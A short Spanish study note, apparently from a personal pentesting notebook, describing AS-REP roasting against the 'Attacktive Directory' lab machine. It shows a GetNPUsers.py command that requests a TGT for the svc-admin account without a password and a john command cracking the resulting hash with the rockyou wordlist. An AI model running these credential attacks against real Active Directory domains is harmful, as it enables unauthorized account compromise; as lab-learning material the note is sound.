**GetNPUsers** nos permitirá consultar cuentas ASReproastable desde el Key Distribution Center. Lo único que se necesita para consultar las cuentas es un conjunto válido de nombres de usuario que hayamos enumerado previamente mediante Kerbrute.

# Ejemplo
Ahora en este punto podemos hacer uso de [[4 - ASREPRoasting con Kerbrute y GetNPUsers]] para enviar una petición como este usuario y recibir el TGT con la contraseña hasheada del mismo
```
GetNPUsers.py spookysec.local/svc-admin -no-pass
```
![[Pasted image 20240717104000.png]]

Y ahora podemos crackearlo con john the ripper
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
![[Pasted image 20240717104616.png]]

Resuelto en la maquina[[MAQUINA ATTACKTIVE DIRECTORY(enum4linux, kerbrute enumerar usuarios, ASREPRoasting obtener TGT, john the ripper, smbclient para listar recursos compartidos, secredump dumpear hashes y pass the hash)]]